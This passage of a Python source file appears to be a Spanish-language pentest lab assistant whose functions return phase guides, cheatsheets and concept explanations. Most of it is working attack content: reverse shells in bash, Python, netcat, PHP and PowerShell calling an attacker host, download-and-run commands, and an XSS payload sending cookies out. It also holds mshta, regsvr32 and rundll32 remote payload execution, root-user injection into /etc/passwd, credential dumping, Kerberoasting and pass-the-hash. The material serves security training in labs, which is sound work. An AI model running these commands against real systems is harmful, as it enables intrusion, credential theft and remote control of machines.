                "En entornos reales: documentar el vector exacto de escalada para el reporte con capturas.",
                "No olvidar revisar /home de otros usuarios, /opt, /var/www para archivos de configuración con credenciales.",
            ],
        },
        "post_exploitation_windows": {
            "nombre": "Post-explotación Windows — Escalada de privilegios",
            "objetivo": "Desde shell de usuario → SYSTEM o Domain Admin. Priorizar por privilegios habilitados.",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Orientación inicial",
                    "comando": "whoami /all\nsysteminfo\nnet user\nnet localgroup administrators",
                    "por_que": "whoami /all muestra usuario, grupos Y privilegios del token. Los privilegios son el primer vector en Windows. systeminfo da OS y parches instalados — base para buscar kernel exploits.",
                    "que_buscar": "SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege.",
                },
                {
                    "n": 2,
                    "nombre": "Explotar SeImpersonatePrivilege (el más común)",
                    "comando": ".\\PrintSpoofer.exe -i -c cmd\n# O GodPotato (más moderno, Win 10/11/Server 2019+):\n.\\GodPotato.exe -cmd 'cmd /c whoami'\n# Verificar: whoami → debe ser nt authority\\system",
                    "por_que": "SeImpersonatePrivilege está habilitado por defecto en cuentas de servicio (IIS, MSSQL, etc.). PrintSpoofer y GodPotato abusan del Spooler o COM para impersonar SYSTEM.",
                    "que_buscar": "Salida: nt authority\\system",
                },
                {
                    "n": 3,
                    "nombre": "Servicios con permisos débiles en el binario",
                    "comando": 'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"\nicacls "C:\\ruta\\al\\servicio.exe"',
                    "por_que": "Si el binario de un servicio que corre como SYSTEM tiene permisos de escritura para tu usuario → reemplazarlo con un payload.",
                    "que_buscar": "(F) Full control o (W) Write en icacls para tu usuario o el grupo Everyone/Users.",
                },
                {
                    "n": 4,
                    "nombre": "WinPEAS — enumeración automática",
                    "comando": ".\\winPEAS.exe\n# O desde PowerShell si no puedes subir archivos:\nIEX(New-Object Net.WebClient).downloadString('http://<KALI_IP>/winPEAS.ps1')",
                    "por_que": "WinPEAS enumera automáticamente cientos de vectores: privilegios, servicios, credenciales almacenadas, software instalado, configuraciones débiles.",
                    "que_buscar": "Líneas rojas. Especialmente: credenciales en registro, rutas de servicio no entrecomilladas, DLL hijacking.",
                },
            ],
            "notas_profesionales": [
                "En AD: si tienes credenciales de dominio → BloodHound para paths a Domain Admin.",
                "Volcado de credenciales: mimikatz sekurlsa::logonpasswords (requiere SYSTEM o Debug).",
                "Siempre intentar: impacket-secretsdump si tienes acceso remoto con SYSTEM.",
                "LOLBAS para técnicas con binarios legítimos de Windows: https://lolbas-project.github.io",
            ],
        },
        "password_attacks": {
            "nombre": "Ataques de contraseñas — Cracking y brute force",
            "objetivo": "Obtener credenciales en texto claro a partir de hashes (offline) o mediante fuerza bruta en servicios (online).",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Identificar el tipo de hash",
                    "comando": "hashid '<hash>'\nname-that-hash -t '<hash>'",
                    "por_que": "Un modo incorrecto en hashcat no crackeará nada. La identificación correcta es crítica. Los más comunes: MD5 (-m 0), SHA1 (-m 100), bcrypt (-m 3200), NTLM (-m 1000), sha512crypt (-m 1800).",
                    "que_buscar": "El número de módulo (-m) para hashcat.",
                },
                {
                    "n": 2,
                    "nombre": "Cracking offline con hashcat",
                    "comando": "hashcat -m <MODO> hash.txt /usr/share/wordlists/rockyou.txt\nhashcat -m <MODO> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                    "por_que": "rockyou.txt es la wordlist estándar (14M passwords reales del breach de 2009). Añadir reglas con -r best64 aplica transformaciones (mayúsculas, números al final, sustituciones) — multiplica el hit rate significativamente.",
                    "que_buscar": "Status: Cracked al finalizar.",
                },
                {
                    "n": 3,
                    "nombre": "Brute force de servicios con hydra",
                    "comando": f"hydra -l <USER> -P /usr/share/wordlists/rockyou.txt {ip} ssh\nhydra -l <USER> -P /usr/share/wordlists/rockyou.txt {ip} ftp\nhydra -L users.txt -P passwords.txt {ip} http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials'",
                    "por_que": "Brute force online directo a servicios. IMPORTANTE: ajustar -t (threads, default 16) para no causar lockouts. En entornos reales, acordar con el cliente antes de lanzar.",
                    "que_buscar": "[22][ssh] host: <IP>   login: <USER>   password: <PASS>",
                },
            ],
            "notas_profesionales": [
                "Antes de hashcat: check en CrackStation.net o ntlm.pw — puede estar ya crackeado.",
                "Password spraying (1 password, N usuarios) es menos ruidoso que brute force individual.",
                "En AD: cuidado con lockout policies — enum4linux muestra el threshold.",
                "Hashes NetNTLMv2 de Responder → hashcat -m 5600.",
            ],
        },
        "pivoting": {
            "nombre": "Pivoting — Movimiento lateral por redes internas",
            "objetivo": "Desde una máquina comprometida, acceder a segmentos de red internos no alcanzables directamente desde el atacante.",
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Enumerar la red interna desde el target",
                    "comando": "ip a && ip route\ncat /etc/hosts\narp -a\n# Ping sweep para descubrir hosts:\nfor i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i 2>/dev/null | grep 'bytes from' | awk '{print $4}') & done | tr -d ':'",
                    "por_que": "Antes de pivotar necesitas saber a qué redes tiene acceso el target. ip route revela subredes internas. El ping sweep descubre hosts activos en cada segmento.",
                    "que_buscar": "Subredes internas (/24, /16), hosts adicionales, referencias a IPs en /etc/hosts.",
                },
                {
                    "n": 2,
                    "nombre": "SSH dynamic port forwarding (SOCKS proxy)",
                    "comando": f"# En tu Kali:\nssh -D 9050 -N -f user@{ip}\n\n# En /etc/proxychains4.conf añadir:\nsocks5 127.0.0.1 9050\n\n# Luego usar cualquier herramienta por el tunel:\nproxychains nmap -sT -Pn <IP_INTERNA>\nproxychains curl http://<IP_INTERNA>",
                    "por_que": "-D crea un proxy SOCKS5 dinámico en localhost:9050 que tuneliza todo por SSH. proxychains redirige cualquier herramienta TCP por ese proxy. Es la forma más simple de pivotar si tienes SSH.",
                    "que_buscar": "Servicios internos, otras máquinas en la red interna.",
                },
                {
                    "n": 3,
                    "nombre": "Chisel (cuando no hay SSH o hay restricciones)",
                    "comando": "# En tu Kali (servidor):\n./chisel server -p 8888 --reverse\n\n# En target (cliente) — subir chisel primero:\n./chisel client <KALI_IP>:8888 R:socks\n\n# Usar igual que antes con proxychains",
                    "por_que": "Chisel crea túneles sobre HTTP — útil cuando SSH está bloqueado por firewall. El modo reverse (R:) hace que el target conecte hacia Kali, evitando bloqueos de tráfico entrante.",
                    "que_buscar": "Confirmación: 'session# connected' en el servidor chisel.",
                },
            ],
            "notas_profesionales": [
                "Documentar el mapa de red interno completo — es uno de los hallazgos más valiosos del pentest.",
                "Ligolo-ng es la alternativa moderna a chisel — más transparente, crea una interfaz de red virtual.",
                "En HTB Pro Labs y OSCP el pivoting es esencial — practicarlo bien.",
                "Metasploit: route add + socks_proxy para pivotar desde Meterpreter.",
            ],
        },
    }

    phase_key = phase.lower().strip().replace(" ", "_").replace("-", "_")
    if phase_key not in phases:
        return {
            "status": "not_found",
            "message": f"Fase '{phase}' no reconocida.",
            "available": ", ".join(phases.keys()),
        }

    data = phases[phase_key]
    return {
        "status": "success",
        "phase": data["nombre"],
        "objective": data["objetivo"],
        "steps": data["pasos"],
        "professional_notes": data["notas_profesionales"],
        "context": context or "Sin contexto adicional",
    }


# ============================================================================
# REFERENCIA TÉCNICA — Cheatsheets y conceptos
# ============================================================================


def get_cheatsheet(topic: str) -> dict:
    """Referencia rápida de herramientas y técnicas para consulta durante un lab.

    Args:
        topic: nmap | gobuster | ffuf | metasploit | sqlinjection | xss |
                reverse-shell | shells-upgrade | file-transfer |
                password-cracking | smb | active-directory | burp |
                gtfobins | lolbas

    Returns:
        dict con cheatsheet completo.
    """
    sheets = {
        "nmap": """
╔══════════════════════════════════════════════════╗
║  NMAP — Referencia rápida                        ║
╚══════════════════════════════════════════════════╝

FLUJO ESTÁNDAR:
    nmap -sV --open -T4 <IP> -oN initial.txt        # rápido con versiones
    nmap -p- --open -T4 <IP> -oN all_ports.txt      # todos los puertos
    nmap -sC -sV -p <ports> <IP> -oN targeted.txt   # scripts + versiones

ESCANEOS ESPECÍFICOS:
    nmap -sU --top-ports 20 <IP>                    # UDP (lento, pero importante)
    nmap -Pn -sV <IP>                               # omitir ping previo
    nmap --script=vuln <IP>                         # vulnerabilidades conocidas
    nmap --script=http-enum,http-title -p 80 <IP>   # enumeración web
    nmap --script=smb-vuln* -p 445 <IP>             # vulnerabilidades SMB
    nmap --script=ftp-anon -p 21 <IP>               # check FTP anónimo

VELOCIDAD:
    -T1 (sigilo) → -T3 (normal) → -T4 (labs) → -T5 (insane)
    En real: -T2/-T3 según ROE. En HTB/CTF: -T4.

GUARDAR OUTPUT:
    -oN file.txt   → texto plano (el más usado)
    -oX file.xml   → XML (para importar a metasploit)
    -oA basename   → los tres formatos a la vez
""",
        "gobuster": """
╔══════════════════════════════════════════════════╗
║  GOBUSTER — Fuzzing web                          ║
╚══════════════════════════════════════════════════╝

DIRECTORIOS:
    gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30
    gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30

VHOSTS:
    gobuster vhost -u http://<DOMINIO> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

DNS:
    gobuster dns -d <DOMINIO> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

FLAGS CLAVE:
    -x php,txt,html,bak   extensiones (MUY IMPORTANTE)
    -b 403,404            ignorar estos códigos
    -k                    ignorar SSL inválido
    -o results.txt        guardar output
    -t 30                 threads
    -s 200,301            solo estos códigos

WORDLISTS (orden de uso recomendado):
    /usr/share/wordlists/dirb/common.txt          → rápido, primer intento
    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  → más exhaustivo
    /usr/share/seclists/Discovery/Web-Content/big.txt             → grande
""",
        "ffuf": """
╔══════════════════════════════════════════════════╗
║  FFUF — Fuzzing avanzado                         ║
╚══════════════════════════════════════════════════╝

DIRECTORIOS:
    ffuf -u http://<IP>/FUZZ -w common.txt -c

CON EXTENSIONES:
    ffuf -u http://<IP>/FUZZ -w <wl> -e .php,.html,.txt,.bak -c

PARÁMETROS GET:
    ffuf -u 'http://<IP>/page.php?FUZZ=test' -w burp-parameter-names.txt -c -fs <SIZE>

POST (brute force login):
    ffuf -u http://<IP>/login -X POST -d 'user=admin&pass=FUZZ' -w rockyou.txt -fc 302

VHOSTS:
    ffuf -u http://<IP> -H 'Host: FUZZ.<domain>' -w subdomains.txt -c -fs <SIZE>

FILTROS (críticos para reducir ruido):
    -fc 404,403    filtrar por código HTTP
    -fs 1234       filtrar por tamaño ← EL MÁS ÚTIL
    -fw 10         filtrar por palabras
    -fl 25         filtrar por líneas
    -rate 100      requests/seg (evitar derribar servidor)
""",
        "reverse-shell": """
╔══════════════════════════════════════════════════╗
║  REVERSE SHELLS — Referencia rápida              ║
╚══════════════════════════════════════════════════╝

LISTENER:
    nc -lvnp 4444
    rlwrap nc -lvnp 4444   # con historial (recomendado)

LINUX — Bash:
    bash -i >& /dev/tcp/<KALI>/<PORT> 0>&1

LINUX — Python3:
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI>",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

LINUX — Netcat (sin -e):
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI> <PORT> >/tmp/f

PHP:
    php -r '$sock=fsockopen("<KALI>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

WINDOWS — PowerShell:
    powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<KALI>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

GENERADOR ONLINE: https://www.revshells.com
""",
        "shells-upgrade": """
╔══════════════════════════════════════════════════╗
║  UPGRADE DE SHELL — Obtener TTY completa         ║
╚══════════════════════════════════════════════════╝

POR QUÉ ES NECESARIO:
    Una dumb shell no permite: sudo -l, vim, Ctrl+C sin matar la conexión,
    tab completion, passwords interactivos.

MÉTODO 1 — Python (el más común):
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    [CTRL+Z]
    stty raw -echo; fg
    export TERM=xterm
    stty rows 40 cols 160    # ajustar al tamaño de tu terminal

MÉTODO 2 — script:
    script /dev/null -c bash
    [CTRL+Z]
    stty raw -echo; fg
    export TERM=xterm

MÉTODO 3 — socat (shell más limpia):
    # Kali: socat file:`tty`,raw,echo=0 tcp-listen:4444
    # Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KALI>:4444

TIP: Ver tamaño de tu terminal con: stty size
    Aplicar en target: stty rows <N> cols <N>
""",
        "file-transfer": """
╔══════════════════════════════════════════════════╗
║  TRANSFERENCIA DE ARCHIVOS                       ║
╚══════════════════════════════════════════════════╝

KALI → LINUX TARGET:
    # Kali (servidor): python3 -m http.server 8000
    wget http://<KALI>:8000/<archivo>
    curl -O http://<KALI>:8000/<archivo>

KALI → WINDOWS TARGET:
    certutil -urlcache -f http://<KALI>:8000/<archivo> C:\\Windows\\Temp\\<archivo>
    Invoke-WebRequest -Uri http://<KALI>:8000/<archivo> -OutFile C:\\Temp\\<arch>
    iwr http://<KALI>:8000/<archivo> -O <archivo>

SMB (muy útil para Windows):
    # Kali: impacket-smbserver share . -smb2support
    # Windows: copy \\<KALI>\\share\\archivo .

SCP:
    scp archivo user@<IP>:/tmp/
    scp user@<IP>:/tmp/archivo .

NETCAT:
    nc -lvnp 4444 > archivo      # receptor
    nc -nv <IP> 4444 < archivo   # emisor

BASE64 (sin herramientas):
    # Kali: base64 -w0 archivo
    # Target: echo '<b64>' | base64 -d > archivo
""",
        "metasploit": """
╔══════════════════════════════════════════════════╗
║  METASPLOIT — Referencia rápida                  ║
╚══════════════════════════════════════════════════╝

INICIO: msfconsole -q

BUSCAR Y USAR:
    search <keyword>
    search type:exploit name:apache
    search cve:2021-41773
    use <ruta>
    info

CONFIGURAR:
    show options
    set RHOSTS <IP>
    set LHOST <KALI_IP>
    set LPORT 4444
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    check && run

METERPRETER:
    sysinfo | getuid
    shell → background (CTRL+Z)
    upload <arch> /ruta/
    download /ruta/<arch>
    run post/multi/recon/local_exploit_suggester
    hashdump

SESIONES:
    sessions -l
    sessions -i <ID>

NMAP INTEGRADO:
    db_nmap -sV -sC <IP>
    hosts && services
""",
        "sqlinjection": """
╔══════════════════════════════════════════════════╗
║  SQL INJECTION — Referencia rápida               ║
╚══════════════════════════════════════════════════╝

DETECCIÓN:
    '                     → error de sintaxis
    ' OR 1=1--            → bypass login
    ' OR SLEEP(5)--       → time-based MySQL
    '; WAITFOR DELAY '0:0:5'-- → time-based MSSQL

NÚMERO DE COLUMNAS (ORDER BY):
    ' ORDER BY 1-- → 2-- → ... hasta error → N-1 columnas

UNION-BASED:
    ' UNION SELECT NULL,NULL--         # 2 columnas
    ' UNION SELECT @@version,NULL--    # versión DB
    ' UNION SELECT table_name,NULL FROM information_schema.tables--
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

SQLMAP:
    sqlmap -u "http://<IP>/page?id=1" --batch --dbs
    sqlmap -u "http://<IP>/page?id=1" -D <db> -T <tabla> --dump
    sqlmap -r request.txt --level=3 --risk=2
    sqlmap -u "<URL>" --forms --crawl=2
""",
        "active-directory": """
╔══════════════════════════════════════════════════╗
║  ACTIVE DIRECTORY — Referencia rápida            ║
╚══════════════════════════════════════════════════╝

ENUMERACIÓN (Linux, con creds):
    crackmapexec smb <DC> -u user -p pass --users --groups
    ldapdomaindump -u 'DOM\\user' -p pass <DC>
    bloodhound-python -d <dom> -u user -p pass -ns <DC> -c all

KERBEROASTING:
    impacket-GetUserSPNs <dom>/user:pass -dc-ip <DC> -request -outputfile tgs.txt
    hashcat -m 13100 tgs.txt rockyou.txt

AS-REP ROASTING:
    impacket-GetNPUsers <dom>/ -usersfile users.txt -dc-ip <DC> -no-pass -format hashcat
    hashcat -m 18200 asrep.txt rockyou.txt

PASS-THE-HASH:
    impacket-psexec -hashes :<NT> Administrator@<IP>
    crackmapexec smb <IP> -u Administrator -H <NT>

DCSYNC (si tienes permisos):
    impacket-secretsdump <dom>/user:pass@<DC> -just-dc

BLOODHOUND:
    neo4j console & bloodhound &
    # Importar JSONs → buscar: "Shortest Paths to Domain Admins"
""",
        "password-cracking": """
╔══════════════════════════════════════════════════╗
║  PASSWORD CRACKING — Referencia rápida           ║
╚══════════════════════════════════════════════════╝

IDENTIFICAR HASH:
    hashid '<hash>'
    name-that-hash -t '<hash>'

MODOS HASHCAT:
    -m 0      MD5
    -m 100    SHA1
    -m 1400   SHA256
    -m 1800   sha512crypt $6$ (Linux shadow)
    -m 3200   bcrypt $2a/$2b$
    -m 1000   NTLM (Windows)
    -m 5600   NetNTLMv2 (Responder)
    -m 13100  TGS-REP (Kerberoasting)
    -m 18200  AS-REP Roasting

HASHCAT:
    hashcat -m <M> hash.txt rockyou.txt
    hashcat -m <M> hash.txt rockyou.txt -r best64.rule
    hashcat -m <M> hash.txt -a 3 '?u?l?l?l?d?d?d?d'  # máscara

JOHN:
    john hash.txt --wordlist=rockyou.txt
    john --show hash.txt

CHECK ONLINE PRIMERO:
    https://crackstation.net  |  https://ntlm.pw
""",
        "smb": """
╔══════════════════════════════════════════════════╗
║  SMB — Referencia rápida                         ║
╚══════════════════════════════════════════════════╝

INICIAL:
    crackmapexec smb <IP>
    smbclient -L //<IP> -N
    enum4linux -a <IP>
    smbmap -H <IP>

CON CREDENCIALES:
    crackmapexec smb <IP> -u user -p pass --shares --users
    smbclient //<IP>/<share> -U 'user%pass'
    smbmap -H <IP> -u user -p pass

DENTRO DE SMBCLIENT:
    ls && get <archivo>
    recurse ON; prompt OFF; mget *    # descargar todo

VULNERABILIDADES:
    nmap --script=smb-vuln* -p 445 <IP>

EJECUCIÓN REMOTA:
    impacket-psexec user:pass@<IP>
    impacket-smbexec user:pass@<IP>
    impacket-secretsdump user:pass@<IP>  # dump hashes
""",
        "burp": """
╔══════════════════════════════════════════════════╗
║  BURP SUITE — Referencia rápida                  ║
╚══════════════════════════════════════════════════╝

SETUP:
    Proxy → 127.0.0.1:8080
    CA cert → http://burp → Download → importar en browser

FLUJO:
    Intercept ON → capturar request → Ctrl+R (Repeater) → modificar → Send

MÓDULOS:
    Proxy    → capturar/modificar en tiempo real
    Repeater → reenviar modificado (Ctrl+R)
    Intruder → fuzzing/brute force (Ctrl+I)
    Decoder  → base64/URL/HTML encode/decode
    Comparer → diferencias entre respuestas

INTRUDER TIPOS:
    Sniper        → 1 lista, 1 posición
    Pitchfork     → N listas paralelas (user:pass)
    Cluster bomb  → producto cartesiano

ATAJOS:
    Ctrl+R  Send to Repeater
    Ctrl+I  Send to Intruder
    Ctrl+U  URL encode

EXTENSIONES ÚTILES:
    JWT Editor, Autorize, Logger++, Turbo Intruder
""",
        "gtfobins": """
╔══════════════════════════════════════════════════╗
║  GTFOBins — Escalada SUID/sudo más comunes       ║
╚══════════════════════════════════════════════════╝

REFERENCIA: https://gtfobins.github.io

find (SUID):
    find . -exec /bin/sh -p \\; -quit

python3 (SUID o sudo):
    python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

vim (SUID o sudo):
    vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

bash (SUID):
    bash -p

perl (SUID):
    perl -e 'exec "/bin/sh";'

awk (SUID):
    awk 'BEGIN {system("/bin/sh")}'

less/more (SUID):
    # Dentro del pager: !/bin/sh

cp (SUID):
    # Añadir usuario root a /etc/passwd:
    openssl passwd -1 hacker123 → obtener hash
    echo 'hacker:$HASH:0:0::/root:/bin/bash' >> /etc/passwd

SUDO NOPASSWD — patrón:
    sudo vim -c ':!bash'
    sudo python3 -c 'import os; os.system("/bin/bash")'
    sudo find /tmp -exec /bin/bash \\;
""",
        "lolbas": """
╔══════════════════════════════════════════════════╗
║  LOLBAS — Living Off The Land (Windows)          ║
╚══════════════════════════════════════════════════╝

REFERENCIA: https://lolbas-project.github.io

DESCARGA DE ARCHIVOS:
    certutil -urlcache -f http://<IP>/arch.exe C:\\Temp\\arch.exe
    bitsadmin /transfer j /download http://<IP>/arch C:\\Temp\\arch
    Invoke-WebRequest (PowerShell)

EJECUCIÓN:
    rundll32 shell32.dll,ShellExec_RunDLL http://<IP>/payload
    mshta http://<IP>/payload.hta
    regsvr32 /s /n /u /i:http://<IP>/payload.sct scrobj.dll

VOLCADO DE CREDENCIALES (con SeBackupPrivilege):
    reg save HKLM\\SAM C:\\Temp\\SAM
    reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
    # Offline: impacket-secretsdump LOCAL -sam SAM -system SYSTEM

APPLOCKER BYPASS:
    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe
    C:\\Windows\\SysWOW64\\msbuild.exe
""",
        "xss": """
╔══════════════════════════════════════════════════╗
║  XSS — Referencia rápida                         ║
╚══════════════════════════════════════════════════╝

DETECCIÓN:
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>
    "><script>alert(1)</script>

BYPASS DE FILTROS:
    <ScRiPt>alert(1)</sCrIpT>
    <img src=x onerror="alert&#40;1&#41;">
    <details open ontoggle=alert(1)>

ROBO DE COOKIES:
    <script>document.location='http://<KALI>:8000/steal?c='+document.cookie</script>
    # Listener: python3 -m http.server 8000

BLIND XSS (no ves el output):
    # XSS Hunter: https://xsshunter.trufflesecurity.com
    <script src="https://tu.xsshunter.com/payload"></script>

DOM XSS — fuentes a buscar:
    document.write(), innerHTML, eval(), location.hash, location.search
""",
    }

    key = topic.lower().strip().replace(" ", "-").replace("_", "-")
    if key not in sheets:
        matches = [k for k in sheets if key in k or k in key]
        if matches:
            key = matches[0]

    if key in sheets:
        return {"status": "success", "topic": key, "cheatsheet": sheets[key]}

    return {
        "status": "not_found",
        "error": f"'{topic}' no disponible.",
        "available": ", ".join(sorted(sheets.keys())),
    }


def explain_concept(concept: str) -> dict:
    """Explica un concepto de seguridad en profundidad con enfoque pedagógico.

    Proporciona: definición, mecanismo técnico, cuándo aparece en labs,
    cómo explotarlo y cómo defenderse.

    Args:
        concept: Concepto a explicar. Ejemplos: 'SUID', 'SQLi', 'reverse shell',
                'SSRF', 'XXE', 'path traversal', 'IDOR', 'JWT', 'CSRF',
                'deserialization', 'kerberoasting', 'pass the hash', 'SMB relay'

    Returns:
        dict con explicación estructurada.
    """
    if not concept:
        return {"status": "error", "message": "Especifica el concepto."}

    concepts = {
        "suid": {
            "nombre": "SUID — Set User ID",
            "definicion": "Bit de permiso en Linux que hace que un ejecutable corra con los privilegios del propietario del archivo, no del usuario que lo ejecuta.",
            "mecanismo": "Cuando /usr/bin/passwd tiene SUID y propietario root, cualquier usuario que lo ejecute opera como root durante esa ejecución. Necesario para que un usuario normal modifique /etc/shadow. El problema: binarios 'no estándar' con SUID pueden abusarse para obtener shell de root.",
            "en_labs": "Presente en prácticamente todos los labs de privilege escalation. Los más frecuentes: find, vim, python, bash, nmap (versiones antiguas), cp, awk.",
            "como_explotar": "find / -perm -u=s -type f 2>/dev/null → buscar binarios inusuales → gtfobins.github.io → buscar el binario → sección SUID.",
            "defensa": "Auditar periódicamente: find / -perm -u=s -type f 2>/dev/null. Solo deberían tener SUID los binarios del sistema necesarios.",
        },
        "path traversal": {
            "nombre": "Path Traversal / Directory Traversal",
            "definicion": "Vulnerabilidad que permite acceder a archivos fuera del directorio raíz de la aplicación usando secuencias '../' para navegar el sistema de archivos.",
            "mecanismo": "App: GET /download?file=report.pdf → el servidor lee /app/files/report.pdf. Si no valida: GET /download?file=../../../etc/passwd → el servidor lee /etc/passwd y lo devuelve. Variantes: URL encoding (%2e%2e%2f), doble encoding (%252e), null bytes.",
            "en_labs": "Apache CVE-2021-41773 es el ejemplo más famoso. Parámetros 'file', 'path', 'page', 'include', 'template' son candidatos.",
            "como_explotar": "Probar ../../../etc/passwd en parámetros de carga de archivos. En Apache 2.4.49: curl 'http://<IP>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'",
            "defensa": "Canonicalizar rutas con realpath(). Allowlist de extensiones y directorios permitidos. Chroot jail para el proceso.",
        },
        "reverse shell": {
            "nombre": "Reverse Shell",
            "definicion": "La máquina víctima inicia una conexión hacia el atacante, estableciendo un canal de comandos. Opuesto al bind shell (donde el atacante se conecta a la víctima).",
            "mecanismo": "1. Atacante abre listener: nc -lvnp 4444. 2. Código en víctima abre socket hacia atacante y redirige stdin/stdout/stderr. 3. Atacante recibe shell. Funciona contra firewalls porque los firewalls suelen bloquear conexiones entrantes pero permiten las salientes.",
            "en_labs": "El mecanismo estándar para obtener acceso inicial tras RCE, SQLi con FILE, subida de webshell, LFI + log poisoning, etc.",
            "como_explotar": "Ver cheatsheet reverse-shell. Siempre usar rlwrap nc -lvnp 4444 para tener historial.",
            "defensa": "Egress filtering, monitorización de conexiones salientes inusuales, EDR con detección de process injection.",
        },
        "ssrf": {
            "nombre": "SSRF — Server-Side Request Forgery",
            "definicion": "El servidor realiza peticiones HTTP a destinos controlados por el atacante, incluyendo la red interna.",
            "mecanismo": "App: POST /fetch?url=http://user-supplied-url. Atacante envía: url=http://169.254.169.254/latest/meta-data/ (AWS metadata) o url=http://localhost:6379 (Redis interno). El servidor hace la petición y devuelve la respuesta al atacante.",
            "en_labs": "Funciones de 'fetch URL', 'import from URL', webhooks, generadores de PDF desde HTML, proxies.",
            "como_explotar": "Probar http://127.0.0.1, http://localhost, http://169.254.169.254 en parámetros de URL. Burp Collaborator para SSRF ciego.",
            "defensa": "Allowlist estricta de dominios. Bloquear rangos RFC1918. Deshabilitar redirecciones HTTP en la librería de peticiones.",
        },
        "idor": {
            "nombre": "IDOR — Insecure Direct Object Reference",
            "definicion": "Control de acceso roto donde la app usa identificadores predecibles para acceder a recursos sin verificar si el usuario tiene permiso.",
            "mecanismo": "GET /api/user/1001/profile → perfil del usuario 1001. Usuario autenticado como 1002 cambia el ID: /api/user/1001/profile. Si la app no verifica autorización → acceso a datos de otro usuario. También en facturas, pedidos, archivos.",
            "en_labs": "Muy común en APIs REST. Buscar IDs numéricos secuenciales o GUIDs en URLs y parámetros POST/PUT.",
            "como_explotar": "Autenticarse como usuario A. Capturar request con Burp. Cambiar el ID al de otro usuario/recurso. Automatizar con Intruder para múltiples IDs.",
            "defensa": "Verificar en servidor que el usuario autenticado tiene permiso sobre el recurso específico. No confiar en que UUIDs aleatorios previenen el acceso.",
        },
        "kerberoasting": {
            "nombre": "Kerberoasting",
            "definicion": "Ataque AD donde cualquier usuario de dominio puede solicitar tickets TGS de service accounts con SPN, cifrados con el hash NTLM de la cuenta, crackeable offline.",
            "mecanismo": "1. Solicitar TGS tickets para todos los SPNs del dominio. 2. Los tickets están cifrados con el hash de la cuenta de servicio. 3. Descargar los tickets. 4. Crackear con hashcat -m 13100. 5. Obtener contraseña de la service account (que suele tener altos privilegios).",
            "en_labs": "Presente en todos los labs AD. HTB Pro Labs, OSCP, PWK. Requiere mínimo un usuario de dominio.",
            "como_explotar": "impacket-GetUserSPNs <dom>/user:pass -dc-ip <DC> -request → hashcat -m 13100 tgs.txt rockyou.txt",
            "defensa": "Service accounts con contraseñas >25 caracteres aleatorios. Usar gMSA. Monitorizar TGS requests inusuales en SIEM.",
        },
        "pass the hash": {
            "nombre": "Pass-the-Hash (PtH)",
            "definicion": "Usar el hash NTLM de una contraseña directamente para autenticarse en Windows, sin necesitar la contraseña en texto claro.",
            "mecanismo": "NTLM: el servidor envía un challenge, el cliente responde con HMAC usando el hash NTLM como clave. Si tienes el hash (de SAM, NTDS, o memoria vía mimikatz), puedes calcular la respuesta correcta sin saber la contraseña original.",
            "en_labs": "Movimiento lateral en entornos Windows/AD después de hashdump o secretsdump.",
            "como_explotar": "impacket-psexec -hashes :<NT_hash> Administrator@<IP>. crackmapexec smb <IP> -u Admin -H <NT> --exec-method smbexec",
            "defensa": "Windows Credential Guard. LAPS para contraseñas únicas por máquina. No reutilizar contraseñas de admin local.",
        },
        "jwt": {
            "nombre": "JWT — JSON Web Token",
            "definicion": "Token de autenticación compuesto por header.payload.signature en base64. Si la firma no se valida correctamente, puede manipularse para escalar privilegios.",
            "mecanismo": "Estructura: os.getenv('Estructura_JWT')<firma>. Ataques comunes: (1) alg:none → eliminar firma completamente, (2) cambiar RS256 a HS256 con clave pública como secreto, (3) brute force del secreto HMAC.",  # 'pragma: allowlist secret'
            "en_labs": "Muy común en labs de web. Buscar cookies o headers Authorization: Bearer <token>.",
            "como_explotar": "Decodificar en jwt.io. Intentar alg: none. Con Burp JWT Editor: modificar claims y re-firmar. john --wordlist=rockyou.txt jwt.txt para brute force.",
            "defensa": "Validar siempre el algoritmo explícitamente. Rechazar alg:none. Usar secretos HMAC fuertes. Validar claims como exp, iss, aud.",
        },
    }

    key = concept.lower().strip().replace("-", " ").replace("_", " ")
    matched = next((k for k in concepts if key in k or k in key), None)

    if matched:
        info = concepts[matched]
        return {
            "status": "success",
            "concept": info["nombre"],
            "definition": info["definicion"],
            "how_it_works": info["mecanismo"],
            "when_in_labs": info["en_labs"],
